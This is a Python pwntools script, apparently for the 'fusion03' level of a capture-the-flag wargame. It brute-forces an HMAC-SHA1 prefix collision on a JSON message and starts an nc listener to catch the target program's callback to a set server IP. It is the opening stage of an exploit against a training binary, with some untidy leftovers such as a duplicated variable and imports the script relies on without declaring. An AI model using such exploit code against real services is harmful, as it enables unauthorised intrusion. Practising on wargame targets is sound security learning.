from pwn import *
import json
import hmac
from hashlib import sha1


############################################################################################################################################################
# GET POST REQUEST FROM LOCAL C PROGRAM INTO LISTENING NC ON ETHERNET NIC
############################################################################################################################################################


level = "fusion03"

err_log_file = open("/home/kali/CLionPrjects/"+level+"/err.log", 'w')
p = process(["/home/kali/CLionPrjects/"+level+"/cmake-build-debug/"+level], stderr=err_log_file.fileno())


level = "fusion03"

def random_string(size=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))



pid = process(["pgrep", level]).recvall().decode("utf-8")

log.info(f"pid: {pid}")

guest_ip = "192.168.2.129"
host_ip = "192.168.2.111"
guest_ip = host_ip


# stdout = process(["cat", "/proc/"+pid+"/fd/1"])
# stderr = process(["cat", "/proc/"+pid+"/fd/2"])

# def send(data):
#     file = "/tmp/send-file-gil"
#     write(file, data)
#     process("cat " + file > "/proc/" + pid + "/fd/0", shell=True)


def gen_payload(token, tags, content, serverip):
    while (True):
        title = random_string(20)

        msg = json.dumps({
            "tags": tags,
            "title": title,
            "contents": content,
            "serverip": serverip
        })

        # log.info(f"msg: {msg}")

        payload = b""
        payload += token
        payload += b"\n"
        payload += bytes(msg, "utf-8")

        hashed = hmac.new(token, payload, sha1)
        # print(hashed.hexdigest()[:4])

        if hashed.hexdigest()[:4] == "0000":
            log.info(f"Hash: {hashed.hexdigest()}")
            return payload


listener_port = "4000"

# s = connect("03")
# dmesg = Dmesg(s)


def start_receiving_nc():
    listener_nc = process(["nc", "-l", "-p", listener_port, guest_ip])
    while True:
        print("waiting for data")
        print(listener_nc.recv())


thread = threading.Thread(target=start_receiving_nc)
thread.start()
sleep(1)

# nc = s.process(["nc", "localhost", port])

token = p.recv().rstrip().replace(b"\"", b"")
# token = b"// 127.0.0.1:59633-1615872148-93892559-1767467136-447270649"


log.info(f"token: {token}")


tags = ["tag1", "tag2", "tag3"]
content = "x"*10
# serverip = "127.0.0.1:"+listener_port
serverip = host_ip+":"+listener_port

payload = gen_payload(token, tags, content, serverip)

log.info(f"payload: {payload}")

p.interactive()
p.send(payload)
# send EOF
p.shutdown()


log.info("payload sent")
# nc.recvall(timeout=3)

# "and done!", nah stdout is closed
# print(nc.recvline())


print("payload sent")
try:
    while True:
        print(p.recvline().replace(b"\n", b""))
except EOFError:
    print("done")






